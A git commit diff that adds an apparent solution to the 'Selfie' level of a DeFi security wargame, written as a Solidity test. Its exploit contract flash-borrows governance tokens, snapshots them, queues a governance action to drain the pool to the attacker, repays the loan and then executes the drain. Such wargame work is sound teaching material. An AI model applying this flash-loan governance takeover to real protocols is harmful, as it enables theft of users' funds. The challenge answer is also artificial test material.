0a9feaceb2b747dcc2d9f30829f1abbb806f24b9
0xdineshkumarsm <105421120+0xdineshkumarsm@users.noreply.github.com>
2022-07-18 09:13:12 +0530

    Solution 6 - Selfie

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -8,6 +8,39 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+contract MaliciousLender {
+    SimpleGovernance simpleGovernance;
+    uint256 actionId;
+
+    address owner;
+
+    constructor(SimpleGovernance _simpleGovernance){
+        owner = msg.sender;
+        simpleGovernance = _simpleGovernance;
+
+    }
+
+    function getFlashLoan(SelfiePool poolContract,uint256 borrowAmount) public{
+        require(msg.sender == owner, "only owner");
+        poolContract.flashLoan(borrowAmount);
+    }
+
+    function receiveTokens(DamnValuableTokenSnapshot token,uint256 borrowAmount) public {
+        // snapshot to save current balance state
+        token.snapshot();
+        // proposing an action since we now have more than half of the token's totalsupply 
+        actionId = simpleGovernance.queueAction(msg.sender,abi.encodeWithSignature("drainAllFunds(address)",owner),0);
+        // repay the flash loan
+        token.transfer(msg.sender,borrowAmount);
+
+    }
+
+    function executeDrain() public {
+        require(msg.sender == owner, "only owner");
+        simpleGovernance.executeAction(actionId);
+    }
+}
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -45,6 +78,13 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+        MaliciousLender maliciousLender = new MaliciousLender(simpleGovernance);
+        maliciousLender.getFlashLoan(selfiePool,TOKENS_IN_POOL);
+        vm.warp(block.timestamp+simpleGovernance.getActionDelay());
+        maliciousLender.executeDrain();
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
